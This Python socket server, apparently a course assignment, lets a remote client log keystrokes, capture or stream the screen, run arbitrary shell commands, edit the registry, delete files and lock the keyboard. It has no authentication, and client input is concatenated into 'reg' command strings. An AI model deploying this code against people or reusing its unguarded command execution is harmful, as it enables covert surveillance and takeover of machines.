import sys
from shutil import copy2,copytree
import socket
import threading
import time
from PIL import Image
import numpy as np
from FileManager import view_folder
from ScreenShot import*
from RunningProccess import*
from KeyLogger import*
from ShutDown import*
from Registry import*
from tkinter import*
from streaming import*
from uuid import getnode as get_mac

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
# SERVER = "127.0.0.1"
ADDR= (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "DISCONNECT!"
TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
RUNNING_PROCESS ="CHECK RUNNING PROCESS"
RUNNING_APP ="CHECK RUNNING APP"
STOP_LISTING = "STOP"
START_LISTING = "START LISTING"
KILL_APP_VIA_PID = "KILL APP VIA PID"
KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
START_PROCESS = "START PROCESS"
KEYLOGGING ="KEY LOG"
STOP_KEYLOGGING = "STOP KEYLOGGING"
PRINT_KEYLOG = "PRINT KEYLOG"
SHUTDOWN = "SHUTDOWN"
CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
SEND_FILE = "SEND FILE"
SEND_REG_FILE = "SEND REG FILE"
DELETE_KEY_VALUE = "DELETE REG VALUE"
GET_KEY_VALUE = "GET KEY VALUE"
ADD_NEW_KEY = "ADD NEW KEY"
DELETE_KEY = "DELETE KEY"
SET_KEY_VALUE ="SET KEY VALUE"
LIVE_SCREEN = "LIVE SCREEN"
STOP_LIVE = "STOP LIVE"
VIEW_FOLDER = "VIEW FOLDER"
DELETE_FILE = "DELETE FILE"
COPY_DIR = "COPY DIR"
SHOW_MAC_ADDR = "SHOW MAC ADDR"
LOG_OUT = "LOG OUT"
LOCK_KEYBOARD = "LOCK KEYBOARD"
UNLOCK_KEYBOARD = "UNLOCK KEYBOARD"


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def send1(conn,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    conn.send(send_length)
    conn.send(message)

def recv1(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg
    return ""

def get_Size(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size


def send_file1(conn,filename):
    file = open(filename,"rb")
    size = get_Size(file)
    
    file.close()
    send1(conn,str(size))
    t = size/2
    t = int(t)
    with open(filename,'rb') as fp:
        for i in range(t):
            data = fp.read(2)
            conn.send(data)








def handle_client(conn, addr):    
    connected = True
    
    while connected:
        try:
            msg_length = conn.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                msg = conn.recv(msg_length).decode(FORMAT)
                print(f"[{addr}] {msg}") 
                


                if msg == TAKE_SCREEN_SHOT:
                    Take_Screenshot("ScreenShot.png")
                    send_file1(conn,"ScreenShot.png")
                        



                elif msg == RUNNING_PROCESS:
                    list_proc = enum_running_process()
                    size = len(list_proc)
                    size = str(size)
                    if size =='0':
                        send1(conn,'No running process!')
                    else:
                        send1(conn,size)
                        for app in list_proc:
                            send1(conn,app[0])
                            send1(conn,app[1])
                            send1(conn,app[2])
                    




                elif msg == KILL_PROCESS_VIA_PID:
                    def execute():
                        pid = recv1(conn)
                        pid = int(pid)
                        process_killed = kill_process_by_id(pid)
                        send1(conn,str(process_killed))
                    sidequest_thread = threading.Thread(target= execute)
                    sidequest_thread.start()
                    
                

            
                    
                
                elif msg == START_PROCESS:
                    proc = recv1(conn)
                    def execute():
                        os.system(proc)
                    sidequest_thread = threading.Thread(target= execute)
                    sidequest_thread.start()

                    
                elif msg == KEYLOGGING:
                    def init_listener():
                        with Listener(on_press = getKey) as listener:
                            listener.join()
                    sidequest_thread = threading.Thread(target= init_listener)
                    sidequest_thread.start()
                
                elif msg == STOP_KEYLOGGING:
                    for i in range(10):
                        Key_press(Key.f12)
                    
                
                elif msg == PRINT_KEYLOG:
                    try:
                        with open("KeyLog.txt","r") as file:
                            key_log_string=file.read()
                            
                        send1(conn,key_log_string)
                        #Delete previous log
                        os.remove('KeyLog.txt')
                    except FileNotFoundError:
                        send1(conn,"File not found")


                elif msg == SHUTDOWN:
                    sec = 40
                    send1(conn,f"Server shutdown in {sec} seconds")
                    shutdown(sec)

                
                    


                elif msg == SEND_REG_FILE:
                    content = recv1(conn)
                    filename = "C:\Client_Reg.reg"
                    with open(filename,'w') as reg_file:
                        reg_file.write(content)
                    os.system("regedit /s " + filename)
                    

                elif msg == GET_KEY_VALUE:
                    path = recv1(conn)
                    value = recv1(conn)
                    ans = get_registry_value(path,value)
                    send1(conn,ans)

                elif msg == DELETE_KEY_VALUE:
                    path = recv1(conn)
                    print(path)
                    value = recv1(conn)
                    print(value)
                    ans = os.system("reg delete "+path+" /v "+ value + " /f")
                    send1(conn,str(ans))

                elif msg == ADD_NEW_KEY:
                    path = recv1(conn)
                    ans = os.system('reg add '+ path)
                    send1(conn,str(ans))

                elif msg == DELETE_KEY:
                    path = recv1(conn)
                    ans = os.system('reg delete '+ path + ' /f')
                    send1(conn,str(ans))

                
                elif msg == SET_KEY_VALUE:
                    path = recv1(conn)
                    value = recv1(conn)
                    data = recv1(conn)
                    data_type = recv1(conn)
                    ans = os.system('reg add '+ path +' /v '+ value+ ' /t '+ data_type+ ' /d '+data+ ' /f')
                    send1(conn,str(ans))


                elif msg == RUNNING_APP:
                    list_app = enum_running_app()
                    print(list_app)
                    size = len(list_app)
                    if size > 0:
                        send1(conn,str(size))
                        for app in list_app:
                            send1(conn,app[0])
                            
                            send1(conn,app[1])
                            send1(conn,app[2])
                        
                    else:
                        send1(conn,"No running app!")
                    
                
                elif msg == LIVE_SCREEN:

                    c = conn.recv(1).decode(FORMAT)
                    
                    while(c=="Y"):
                        img = pyautogui.screenshot()
                        frame = np.array(img)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                        frame = imutils.resize(frame,width=600)
                        a = pickle.dumps(frame)
                        message = struct.pack("Q",len(a))+a 
                        conn.sendall(message)
                        
                        #cv2.imshow('TRANSMITTING VIDEO',frame)
                             
                        
                        # key = cv2.waitKey(1) & 0xFF
                        c = conn.recv(1).decode(FORMAT)
                        if c == 'N':
                            break

                   
                elif msg == VIEW_FOLDER:
                    path = recv1(conn)
                    list_dir = view_folder(path)
                    list_len = len(list_dir)
                    
                    send1(conn,str(list_len))

                    for i in range(list_len):
                        send1(conn,list_dir[i][0])
                        send1(conn,str(int(list_dir[i][1])))
                elif msg == DELETE_FILE:
                    path = recv1(conn)
                    if (path[len(path)-1]=='/'):
                            path = path[:(len(path)-2)]
                    try:
                        os.remove(path)
                        send1(conn,"DONE")
                    except Exception:
                        send1(conn,"FAIL")
                    

                elif msg == COPY_DIR:
                    dir = recv1(conn)
                    try:
                        if dir[len(dir)-1]=='/':
                            dir = dir[:(len(dir)-2)]
                            copy_dir = dir  +"(copy)"
                            copytree(dir,copy_dir)
                        else:
                            copy_dir = dir  +"(copy)"
                            copy2(dir,copy_dir)
                        send1(conn,"DONE")
                    except Exception:
                        send1(conn,"FAIL")

                elif msg == SHOW_MAC_ADDR:
                    mac = get_mac()
                    mac = str(mac)
                    send1(conn,mac)
                    print(mac)
                elif msg == LOG_OUT:
                    log_out()
                elif msg == LOCK_KEYBOARD:
                    try:
                        Lock_keyboard()
                        send1(conn,"DONE")
                    except Exception:
                        send1(conn,"FAIL")
                elif msg == UNLOCK_KEYBOARD:
                    try:
                        Unlock_keyboard()
                        send1(conn,"DONE")
                    except Exception:
                        send1(conn,"FAIL")
                elif msg == DISCONNECT_MESSAGE:
                    connected = False
                
                else:
                     pass
                time.sleep(0.500)
        except Exception as e:
            print("Gap loi o day")
            print(msg+"===>"+e)
            connected=False
            pass    
    conn.close()



    
    
def start():
    print("[STARTING] server is starting ...")
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    conn, addr = server.accept()
    handle_client(conn,addr)



Server_windows = Tk()
Server_windows.title("Open")
Server_windows.geometry("200x200")

OpenServer_button = Button(Server_windows, text = "Open Server", command= start)
OpenServer_button.place(x = 25, y =25, width = 150, height = 150)

Server_windows.mainloop()

    


# c:/Users/MSI-NK/OneDrive/Máy tính/socketAssignment-main/socketAssignment-main/